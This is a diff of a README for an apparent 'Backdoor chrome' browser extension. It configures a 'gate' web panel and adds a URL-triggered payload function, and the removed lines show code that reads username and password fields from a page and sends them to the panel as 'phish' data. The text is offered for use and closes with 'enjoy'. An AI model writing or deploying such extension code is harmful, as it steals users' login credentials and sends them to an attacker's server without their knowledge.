@@ -6,14 +6,33 @@ change it on manifest
 
 ![Backdoor chrome](http://s15.postimg.org/yf0rmsfuj/rename.png)
 
-## Create payload
+## Change Gate
 ```JavaScript
-    function SITE()
+    var server_web = "http://localhost:8888/"
+    var lock_page = "relais/lock.php"
+    var gate_page = "relais/index.php"
+```
+
+## Check URL
+```JavaScript
+    // VERIFIED D'URL
+    if(tabURL.indexOf('') !== -1 ) // url in ''
     {
-        var urls = window.location.href;
-        var username = $('input[name=username]')[0].value; // exemple
-        var pass = $('input[name=password]')[0].value; // exemple
-        var phish = username+"-123-"+pass; // "-123-" separator
-        $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } ); // send to web panel
+        Payload_exemple();
     }
 ```
+
+## Create payload
+```JavaScript
+    // PAYLOAD FUNCTION NEED HTTPS
+    function Payload_exemple()
+    {
+        console.log('Injected here')
+        var urls = "" // Var for URL
+        var phish = "" // Var for logs 
+        $.get(server_web+gate_page, { info: phish, url: urls } );
+    }
+```
+
+## Go to web relais
+enjoy
